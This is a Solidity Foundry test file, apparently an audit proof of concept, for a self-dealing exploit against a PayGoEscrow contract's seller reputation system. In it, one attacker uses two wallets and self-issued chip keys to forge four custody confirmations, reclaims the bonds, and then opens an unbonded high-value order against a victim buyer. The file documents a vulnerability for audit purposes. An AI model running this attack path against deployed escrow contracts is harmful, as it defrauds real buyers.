// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test} from "forge-std/Test.sol";
import {EvmV1Decoder} from "@gluwa/usc-contracts/contracts/decoding/EvmV1Decoder.sol";
import {INativeQueryVerifier} from "../contracts/Attestcoin.sol";
import {PayGoEscrow} from "../contracts/PayGoEscrow.sol";
import {DemoAsset} from "../contracts/Demo.sol";
import {MockVerifier, MockChainInfo} from "./Mocks.sol";

/// @notice SC-AUDIT-03 (Variant B) — confirmed as a design-level residual, NOT closed by the submitter
///         fix that closes Variant A (origin-slot squatting; see PoC_ChipSquat.t.sol). `_applyCustodyLog`
///         now requires `submitter == o.seller` for role==0 and `submitter == o.buyer` for role==1 —
///         real, unspoofable `msg.sender` checks. But nothing stops one economic attacker from
///         controlling TWO addresses (their seller wallet, and a second wallet they also hold — no real
///         counterparty, no real value ever moved) and naming the second as `buyer` at `createOrder`,
///         then submitting Origin from the first and Delivery from the second: both submitter checks
///         pass trivially, because the attacker genuinely IS both `o.seller` and `o.buyer` on their own
///         sham order. This manufactures 4 "confirmed" SellerPassport records for ~1 wei of real
///         economic cost each, reaching waivesBond()==true, then opens a real high-value order against a
///         REAL, uninvolved victim buyer with ZERO bond posted. See docs/AUDIT.md and
///         docs/08-proof-of-custody.md for why this needs out-of-band chip provisioning to close, not a
///         code-only patch.
contract PoC_SellerPassportForgery is Test {
    address constant VERIFIER = 0x0000000000000000000000000000000000000FD2;
    address constant CHAIN_INFO = 0x0000000000000000000000000000000000000fD3;
    uint64 constant CHAIN_KEY = 1;
    address constant ROUTER = address(0xA11CE);
    address constant CUSTODY_ROUTER = address(0xC0D1E);
    address constant USDC = address(0xBEEF);
    address constant PAYEE = address(0xFEE);

    address seller = address(0x5E11E2);
    address victimBuyer = address(0xB0B);   // real, uninvolved counterparty on the big order

    PayGoEscrow esc;
    DemoAsset nft;

    function setUp() public {
        vm.etch(VERIFIER, address(new MockVerifier()).code);
        vm.etch(CHAIN_INFO, address(new MockChainInfo()).code);
        nft = new DemoAsset();
        address[] memory allowed = new address[](1); allowed[0] = address(nft);
        address[] memory allowedTokens = new address[](1); allowedTokens[0] = USDC;
        esc = new PayGoEscrow(CHAIN_KEY, ROUTER, 2000, 240, allowed, CUSTODY_ROUTER, 240, allowedTokens);
        vm.deal(seller, 1 ether);
    }

    function encodeCustodyTx(address emitter, address escrowAddr, uint256 id, address chip, uint8 role, address submitter)
        internal pure returns (bytes memory)
    {
        bytes32[] memory topics = new bytes32[](3);
        topics[0] = keccak256("PossessionAttested(address,uint256,address,uint8,address)");
        topics[1] = bytes32(uint256(uint160(escrowAddr)));
        topics[2] = bytes32(id);
        EvmV1Decoder.LogEntryTuple[] memory logs = new EvmV1Decoder.LogEntryTuple[](1);
        logs[0] = EvmV1Decoder.LogEntryTuple(emitter, topics, abi.encode(chip, role, submitter));
        bytes[] memory chunks = new bytes[](3);
        chunks[0] = abi.encode(uint64(0), uint64(0), address(0), false, address(0), uint256(0), bytes(""));
        chunks[1] = "";
        chunks[2] = abi.encode(uint8(1), uint64(50_000), logs, bytes(""));
        return abi.encode(uint8(2), chunks);
    }

    function settleCustodyOne(uint64 height, bytes memory txb, uint64 txIndex) internal {
        uint64[] memory hs = new uint64[](1); hs[0] = height;
        bytes[] memory txs = new bytes[](1); txs[0] = txb;
        INativeQueryVerifier.MerkleProof[] memory ps = new INativeQueryVerifier.MerkleProof[](1);
        ps[0] = INativeQueryVerifier.MerkleProof(bytes32(uint256(txIndex)), new INativeQueryVerifier.MerkleProofEntry[](0));
        esc.settleCustody(hs, txs, ps, INativeQueryVerifier.ContinuityProof(bytes32(0), new bytes32[](0)));
    }

    /// One self-dealt order: seller mints a throwaway NFT, posts a 1-wei bond (only required because
    /// waivesBond() is still false at this point), names a SECOND address the attacker also controls
    /// (`selfBuyer`) as buyer, then submits Origin (as `seller`) and Delivery (as `selfBuyer`) custody
    /// attestations for a chip keypair the attacker generated off-chain seconds earlier — nothing
    /// on-chain ties `chip` to a real physical item, and both submitter checks pass because the
    /// attacker genuinely is both `o.seller` and `o.buyer`.
    function _mintOneConfirmedRecord(uint256 seed, uint64 h) internal {
        address selfBuyer = address(uint160(uint256(keccak256(abi.encode("attacker-owned-buyer-wallet", seed)))));
        vm.startPrank(seller);
        uint256 t = nft.mint(seller);
        nft.approve(address(esc), t);
        // price == n == 1: cheapest possible order; `selfBuyer` is the attacker's own second wallet
        uint256 id = esc.createOrder{value: 1}(selfBuyer, nft, t, PAYEE, USDC, 1, 1, 1000 * (uint64(seed) + 1), 1000);
        vm.stopPrank();

        address chip = address(uint160(uint256(keccak256(abi.encode("self-issued-chip", seed))))); // attacker mints this "chip" themselves
        settleCustodyOne(h, encodeCustodyTx(CUSTODY_ROUTER, address(esc), id, chip, 0, seller), uint64(seed * 2));           // Origin, submitted by seller
        settleCustodyOne(h + 1, encodeCustodyTx(CUSTODY_ROUTER, address(esc), id, chip, 1, selfBuyer), uint64(seed * 2 + 1)); // Delivery, submitted by the attacker's own selfBuyer wallet, SAME self-issued chip

        assertTrue(esc.getOrder(id).custodyVerified);
        esc.withdrawBond(id);                 // resolves — credits the pooled claimable balance
        vm.prank(seller);
        esc.claimBond();                      // reclaim the 1 wei bond — the "confirmed" record was free
    }

    function test_sellerForgesWaiverWithNoBuyerAndNoRealDelivery() public {
        assertFalse(esc.sellerPassport().waivesBond(seller));

        uint256 gasBefore = gasleft();
        for (uint256 i; i < 4; i++) _mintOneConfirmedRecord(i, uint64(10_000 + i * 2000));
        uint256 gasUsed = gasBefore - gasleft();

        (uint32 confirmed, uint32 disputed) = esc.sellerPassport().records(seller);
        assertEq(confirmed, 4);
        assertEq(disputed, 0);
        assertTrue(esc.sellerPassport().waivesBond(seller));
        assertEq(seller.balance, 1 ether); // every wei-bond reclaimed — the whole exercise cost only gas

        emit log_named_uint("gas for 4 self-forged 'confirmed' custody records (submitter checks in place, still forgeable)", gasUsed);

        // Now open a REAL high-value order against a real, uninvolved buyer with ZERO bond.
        vm.startPrank(seller);
        uint256 bigTokenId = nft.mint(seller);
        nft.approve(address(esc), bigTokenId);
        uint256 bigOrder = esc.createOrder(victimBuyer, nft, bigTokenId, PAYEE, USDC, 100_000e6, 4, 100_000, 1000); // no msg.value at all
        vm.stopPrank();

        assertEq(esc.custodyBond(bigOrder), 0); // real buyer has zero bond-backed recourse if the delivered item's chip is swapped
    }
}
